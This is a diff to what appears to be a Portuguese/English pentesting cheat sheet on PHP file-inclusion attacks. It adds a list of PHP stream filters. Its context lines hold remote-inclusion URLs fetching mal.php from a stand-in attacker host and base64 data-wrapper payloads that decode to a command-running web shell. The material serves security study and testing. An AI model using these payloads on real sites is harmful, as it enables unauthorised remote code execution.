@@ -111,7 +111,7 @@ http://example.com/index.php?page=http://atacker.com/mal.php
 http://example.com/index.php?page=\\attacker.com\shared\mal.php
 ```
 <p>Se por algum motivo allow_url_include estiver ativado, mas o PHP estiver filtrando o acesso a páginas externas, você pode usar, por exemplo, o wrapper data com base64 para decodificar um código PHP base64 e egt RCE:</p>
-[Ref.:] (https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)
+[Ref.:] (https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/).
 
 ```
 PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
@@ -147,5 +147,29 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9
 ?mod={payload}
 ?conf={payload}
 ```
+## LFI / RFI using PHP wrappers & protocols
+php://filter
+PHP filters allow perform basic modification operations on the data before being it's read or written. There are 5 categories of filters:
+
+- String Filters:
+    - string.rot13
+    - string.toupper
+    - string.tolower
+    - string.strip_tags: Remove tags from the data (everything between "<" and ">" chars)
+> Note that this filter has disappear from the modern versions of PHP
+
+- Conversion Filters:
+    - convert.base64-encode
+    - convert.base64-decode
+    - convert.quoted-printable-encode
+    - convert.quoted-printable-decode
+    - convert.iconv.* : Transforms to a different encoding(convert.iconv.<input_enc>.<output_enc>) . To get the list of all the encodings supported run in the console: iconv -l
+
+- Compression Filters
+    - zlib.deflate: Compress the content (useful if exfiltrating a lot of info)
+    - zlib.inflate: Decompress the data
+    - Encryption Filters
+    - mcrypt.* : Deprecated
+    - mdecrypt.* : Deprecated
 
 
